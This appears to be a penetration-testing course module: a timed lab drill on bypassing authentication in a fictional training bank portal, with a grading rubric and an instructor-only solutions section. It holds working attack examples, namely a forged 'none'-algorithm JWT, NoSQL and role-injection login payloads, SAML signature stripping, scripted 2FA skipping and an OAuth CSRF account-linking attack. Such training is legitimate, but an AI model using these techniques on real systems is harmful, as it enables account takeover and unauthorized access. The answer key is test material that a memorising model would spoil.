# Day 1 - Capstone Drill: Authentication Bypass Challenge

**Duration:** 1.25 hours
**Type:** Hands-on scenario-based assessment
**Difficulty:** Intermediate

---

## Scenario Brief

### Background

**Company:** SecureBank Financial Services
**Target:** Customer portal at `https://securebank.training.local`
**Your Role:** External penetration tester
**Engagement Type:** Web application security assessment

**Scope:**
- Customer portal and authentication system
- API endpoints
- SSO integration
- Admin panel (if you can find it!)

**Out of Scope:**
- Denial of service
- Social engineering
- Physical security

**Rules of Engagement:**
- All testing must be performed on the provided lab environment
- Document every step of your exploitation
- Do not modify or delete existing data
- Report any critical findings immediately

---

## Objectives

### Primary Objectives (Minimum Requirements)

1. **Reconnaissance (25 points)**
   - Map the application attack surface
   - Identify authentication mechanisms
   - Discover hidden endpoints
   - Document technology stack

2. **Authentication Bypass (50 points)**
   - Exploit at least ONE authentication vulnerability
   - Gain unauthorized access to user account OR admin panel
   - Capture proof of successful bypass

3. **Documentation (25 points)**
   - Clear reconnaissance report
   - Step-by-step exploitation narrative
   - Screenshots as evidence
   - Impact assessment

### Bonus Objectives (Extra Credit)

- Discover multiple authentication vulnerabilities (+10 points each)
- Chain vulnerabilities for greater impact (+20 points)
- Develop automated exploit script (+15 points)
- Find sensitive data exposure (+10 points)

---

## Lab Environment

### Access Information

**Target URL:** `https://securebank.training.local`

**Test Accounts:**
- Regular User: `customer1:BankPass123!`
- Regular User: `customer2:SecureP@ss456`
- Corporate Account: `corp.user@company.com:CorpAcct789`

**Unknown/Target Accounts:**
- Admin account exists but credentials unknown
- Service accounts may exist
- VIP customer accounts

### Lab Infrastructure

```
Network: 10.10.100.0/24

Hosts:
- 10.10.100.10: securebank.training.local (Web App)
- 10.10.100.11: api.securebank.training.local (API Server)
- 10.10.100.12: sso.securebank.training.local (SSO Provider)
```

---

## Attack Kill Chain Template

Use this template to structure your attack:

### Phase 1: Reconnaissance (15-20 min)

**Tasks:**
- [ ] Map application structure with Burp Spider
- [ ] Enumerate subdomains and virtual hosts
- [ ] Identify authentication mechanisms (local, SSO, API keys)
- [ ] Discover hidden directories and endpoints
- [ ] Analyze JavaScript files for hardcoded endpoints/secrets
- [ ] Document technology stack

**Tools:**
```bash
# Subdomain enumeration
ffuf -u https://FUZZ.securebank.training.local -w subdomains.txt

# Directory discovery
gobuster dir -u https://securebank.training.local \
  -w /usr/share/wordlists/dirb/common.txt

# JS file analysis
# Extract all .js URLs from Burp sitemap
# Download and search for API endpoints
wget https://securebank.training.local/static/js/main.js
grep -oE '"/[a-zA-Z0-9/_-]+"' main.js | sort -u

# Technology detection
whatweb https://securebank.training.local
```

**Deliverable:** Reconnaissance notes with discovered assets

---

### Phase 2: Vulnerability Identification (20-25 min)

**Potential Attack Vectors to Test:**

**JWT/Token Analysis:**
- [ ] Intercept authentication tokens
- [ ] Analyze JWT structure and claims
- [ ] Test for algorithm confusion vulnerabilities
- [ ] Attempt to crack JWT secret
- [ ] Test token expiration and validation

**OAuth/SSO Testing:**
- [ ] Identify OAuth endpoints
- [ ] Test state parameter implementation
- [ ] Validate redirect_uri security
- [ ] Check for authorization code replay
- [ ] Test scope manipulation

**SAML Testing:**
- [ ] Capture SAML responses
- [ ] Test signature validation
- [ ] Attempt signature wrapping attack
- [ ] Test assertion replay

**2FA/MFA Testing:**
- [ ] Check for 2FA implementation
- [ ] Test if 2FA can be bypassed
- [ ] Verify rate limiting on OTP submission
- [ ] Test for response manipulation

**Session Management:**
- [ ] Analyze session tokens
- [ ] Test for session fixation
- [ ] Check session timeout
- [ ] Test concurrent sessions

**Boundary Conditions:**
- [ ] Test case sensitivity in username
- [ ] Test Unicode/special characters
- [ ] Test SQL truncation
- [ ] Test array/object injection

**Deliverable:** List of identified vulnerabilities with severity

---

### Phase 3: Exploitation (30-35 min)

**Exploit Development:**

Choose your attack path based on discovered vulnerabilities:

**Path A: JWT Exploitation**
```bash
# If JWT found with weak secret or "none" algorithm

# Example: Algorithm confusion
jwt_tool $TOKEN -X a

# Example: Brute-force secret
jwt_tool $TOKEN -C -d wordlist.txt

# Example: Modify claims
jwt_tool $TOKEN -T
# Change role, user_id, or permissions
```

**Path B: OAuth/SAML Bypass**
```xml
<!-- Example: SAML signature removal -->
<!-- Intercept SAML response in Burp -->
<!-- Decode Base64 -->
<!-- Remove <ds:Signature> element -->
<!-- Modify user attributes -->
<!-- Re-encode and forward -->
```

**Path C: 2FA Bypass**
```python
# Example: Direct access after login
import requests

session = requests.Session()

# Step 1: Login
login = session.post('https://securebank.training.local/api/login',
                     json={'username': 'customer1', 'password': 'BankPass123!'})

# Step 2: Skip 2FA, access protected resource
dashboard = session.get('https://securebank.training.local/dashboard')

if "Welcome" in dashboard.text:
    print("2FA bypassed!")
```

**Path D: Parameter Manipulation**
```http
POST /api/login HTTP/1.1
Host: securebank.training.local
Content-Type: application/json

{
  "username": "customer1",
  "password": "BankPass123!",
  "role": "admin"
}

<!-- OR -->

{
  "username": ["admin"],
  "password": {"$ne": null}
}
```

**Deliverable:** Working exploit with proof of access

---

### Phase 4: Post-Exploitation (Optional, 10-15 min)

**If time permits:**
- [ ] Enumerate accessible resources
- [ ] Identify sensitive data exposure
- [ ] Test for privilege escalation
- [ ] Attempt to access other user accounts
- [ ] Document impact

---

### Phase 5: Documentation (15 min)

**Required Deliverables:**

1. **Reconnaissance Report**
```markdown
# SecureBank - Reconnaissance Findings

## Target Information
- Application: SecureBank Customer Portal
- URL: https://securebank.training.local
- Technologies: [List frameworks, libraries, servers]

## Discovered Assets
- Subdomains: [List]
- Endpoints: [List key endpoints]
- Authentication: [Describe mechanisms]

## Attack Surface
- [Key attack vectors identified]
```

2. **Exploitation Report**
```markdown
# Authentication Bypass - Proof of Concept

## Vulnerability Description
[Describe the vulnerability]

## Severity: [Critical/High/Medium/Low]

## Steps to Reproduce
1. [Step-by-step instructions]
2. [Include curl commands or screenshots]
3. [Show the bypass]

## Impact
[What can an attacker do with this?]

## Evidence
[Screenshots, tokens, response data]

## Remediation
[How to fix this vulnerability]
```

3. **Screenshots**
   - Initial application state
   - Burp Suite traffic showing exploitation
   - Successful unauthorized access
   - Admin panel access (if achieved)
   - Sensitive data exposure (if found)

---

## Evaluation Criteria

### Reconnaissance (25 points)

- **Complete (20-25 points):** Thorough enumeration, multiple endpoints/subdomains found, technology stack documented
- **Adequate (15-19 points):** Basic enumeration, key endpoints found
- **Minimal (10-14 points):** Surface-level reconnaissance only
- **Incomplete (0-9 points):** Insufficient reconnaissance

### Exploitation (50 points)

- **Excellent (45-50 points):** Multiple vulnerabilities exploited, admin access gained, full attack chain
- **Good (35-44 points):** At least one authentication bypass, unauthorized access achieved
- **Fair (25-34 points):** Vulnerability identified but incomplete exploitation
- **Poor (0-24 points):** No successful exploitation

### Documentation (25 points)

- **Excellent (23-25 points):** Clear, detailed, professional report with all evidence
- **Good (18-22 points):** Complete report with minor gaps
- **Fair (13-17 points):** Basic documentation, missing some elements
- **Poor (0-12 points):** Incomplete or unclear documentation

---

## Hints & Tips

### Getting Stuck? Try These:

**Hint 1: JWT Analysis**
```bash
# Look for JWT tokens in:
# - Authorization header
# - Cookies
# - Local storage (check browser dev tools)

# Decode JWT at jwt.io
# Look for claims: role, is_admin, permissions, user_id
```

**Hint 2: Hidden Endpoints**
```bash
# Common admin endpoints:
/admin
/administrator
/dashboard
/api/admin
/api/v1/admin
/api/internal

# Common API patterns:
/api/v1/users
/api/v2/users
/graphql
/api-docs
```

**Hint 3: OAuth/SAML**
```bash
# Look for SSO parameters:
SAMLResponse, SAMLRequest, code, state

# Check for:
- Missing state parameter
- Signature validation issues
- Redirect_uri manipulation
```

**Hint 4: Response Manipulation**
```json
// If you see responses like:
{"authenticated": false, "role": "user"}

// Try modifying to:
{"authenticated": true, "role": "admin"}
```

---

## Solutions Guide (Instructor Only)

### Solution 1: JWT Algorithm Confusion

**Vulnerability:** JWT accepts "none" algorithm

**Exploitation:**
```bash
# Original token (from login)
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoidXNlciJ9.SIG"

# Modify header
{"alg": "none", "typ": "JWT"}

# Modify payload
{"user_id": 1, "role": "admin"}

# Create token
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'
echo -n '{"user_id":1,"role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'

# Concatenate with trailing dot
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.
```

### Solution 2: SAML Signature Bypass

**Vulnerability:** SAML signature not validated

**Exploitation:**
1. Intercept POST to /sso/acs
2. Decode SAMLResponse (Base64)
3. Remove `<ds:Signature>` element
4. Change `<saml:NameID>` to admin@securebank.com
5. Re-encode to Base64
6. Forward request

### Solution 3: 2FA Direct Access

**Vulnerability:** 2FA verification not enforced

**Exploitation:**
```bash
# Login
curl -X POST https://securebank.training.local/api/login \
  -d '{"username":"customer1","password":"BankPass123!"}' \
  -c cookies.txt

# Skip 2FA, access dashboard directly
curl https://securebank.training.local/dashboard -b cookies.txt
# Success! 2FA bypassed
```

### Solution 4: OAuth State Parameter Missing

**Vulnerability:** No CSRF protection in OAuth flow

**Exploitation:**
1. Start OAuth flow as attacker
2. Capture callback URL with authorization code
3. Send link to victim
4. Victim's account linked to attacker's OAuth identity

---

## Debrief Questions

After the drill, instructors should facilitate discussion:

1. What reconnaissance techniques were most effective?
2. Which vulnerability did you exploit? Why did you choose it?
3. What challenges did you face during exploitation?
4. How would you prioritize these vulnerabilities in a real assessment?
5. What additional testing would you perform with more time?
6. How would you explain the impact to non-technical stakeholders?

---

## Additional Challenges (If Time Permits)

### Challenge 1: Find the Hidden Admin Panel
- Location: `/internal/admin`
- Access requires JWT with `"admin": true` claim

### Challenge 2: Exploit API Versioning
- `/api/v1/users` - Has authorization checks
- `/api/v2/users` - Missing authorization checks!

### Challenge 3: Session Token Prediction
- Session tokens follow pattern: `user_<id>_<timestamp>`
- Predict admin session token

---

## Wrap-Up

### Key Takeaways

1. **Reconnaissance is critical** - You can't exploit what you don't find
2. **JWT vulnerabilities are common** - Always test signature validation
3. **OAuth/SAML is complex** - Many opportunities for misconfiguration
4. **2FA bypass is possible** - Implementation matters more than the feature
5. **Documentation matters** - Your findings are only valuable if communicated clearly

### Tomorrow's Preview: Day 2

- Password Reset Attacks
- Business Logic Vulnerabilities
- IDOR (Insecure Direct Object References)
- Race Conditions
- HTTP Parameter Pollution

---

## Instructor Checklist

**Before Drill:**
- [ ] Lab environment is running and accessible
- [ ] All test accounts are working
- [ ] Vulnerabilities are confirmed exploitable
- [ ] Timing is tracked (15 min warning before end)

**During Drill:**
- [ ] Monitor student progress
- [ ] Provide hints if students are stuck (after 30 min)
- [ ] Ensure students are documenting as they go
- [ ] Be available for technical questions

**After Drill:**
- [ ] Collect deliverables from all students
- [ ] Facilitate debrief discussion
- [ ] Highlight interesting approaches
- [ ] Preview Day 2 content

**Assessment:**
- [ ] Review each submission
- [ ] Provide individual feedback
- [ ] Identify common mistakes for group discussion
- [ ] Award bonus points for exceptional work
